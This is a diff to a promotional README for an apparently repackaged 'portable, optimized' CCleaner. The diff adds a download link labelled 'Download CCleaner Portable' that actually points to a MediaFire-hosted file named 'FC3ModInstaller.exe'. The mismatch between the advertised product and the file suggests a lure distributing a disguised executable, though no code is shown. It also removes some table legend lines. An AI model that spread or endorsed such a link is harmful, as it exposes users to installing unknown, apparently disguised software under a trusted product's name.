@@ -28,6 +28,8 @@
 🧪 Trusted by millions.  
 🪄 Light. Fast. Ruthless (in the best way).  
 
+## ⬇️ [Download CCleaner Portable](https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file)
+
 ---
 
 📊 Feature Comparison
@@ -57,9 +59,6 @@
 ![CCleaner Settings Screenshot](https://www.snapfiles.com/screenfiles/ccleaner2.png)  
 *Settings and cleanup options*
 
-⚠ — Partially Supported or Limited
-
-❌ — Not Available
 
 📌 This table highlights the advantages of using our portable, optimized version of CCleaner — made for users who value performance, privacy, and control.
 
